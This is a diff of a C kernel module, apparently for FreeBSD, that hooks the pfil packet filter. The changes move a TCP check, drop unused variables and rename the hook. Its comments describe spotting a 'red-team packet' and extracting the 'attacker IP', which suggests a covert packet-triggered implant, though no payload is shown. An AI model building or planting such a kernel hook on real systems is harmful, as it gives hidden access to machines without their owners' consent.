@@ -29,19 +29,12 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
     struct mbuf *m = *mp;
     struct ip *ip_header;
     struct tcphdr *tcp_header;
-    int i;
-    struct file *fp;
-    struct vnode *vp;
-    struct nameidata nd;
     int error;
-
-    // Check if it's a TCP packet
-    if (ip_header->ip_p != IPPROTO_TCP) return PFIL_PASS;;
 
     // Ensure mbuf is valid
     if (m == NULL) return PFIL_PASS;;
 
-   // Make sure the packet has enough data for an IP header
+    // Make sure the packet has enough data for an IP header
     if (m->m_len < sizeof(struct ip)) {
         m = m_pullup(m, sizeof(struct ip));
         if (m == NULL) return PFIL_PASS;;
@@ -54,6 +47,8 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
 
     // Extract the IP header
     ip_header = mtod(m, struct ip *);
+    // Check if it's a TCP packet
+    if (ip_header->ip_p != IPPROTO_TCP) return PFIL_PASS;;
 
     // Ensure there's enough data for TCP header
     if (m->m_len < (ip_header->ip_hl << 2) + sizeof(struct tcphdr)) {
@@ -64,7 +59,6 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
 
 
     // now we know the packet is a red-team packet
-
     // Extract attacker IP and store as a string (since inet_ntoa() isn't available in kernel space)
     char attacker_ip_str[16];
     snprintf(attacker_ip_str, sizeof(attacker_ip_str), "%u.%u.%u.%u",
@@ -115,8 +109,8 @@ static int load(void) {
         .pa_mbuf_chk = packet_filter,       // Function to process packets
         .pa_mem_chk = NULL,                 // No memory-based checks (set to NULL if unused)
         .pa_ruleset = NULL,                 // No custom ruleset (set to NULL if unused)
-        .pa_modname = "my_module",          // Module name
-        .pa_rulname = "my_rule"             // Rule name
+        .pa_modname = "apeshit filtering",          // Module name
+        .pa_rulname = "apeshit 6969 packet"             // Rule name
     };
 
     // pfil_hook_t	pfil_add_hook(struct pfil_hook_args *);
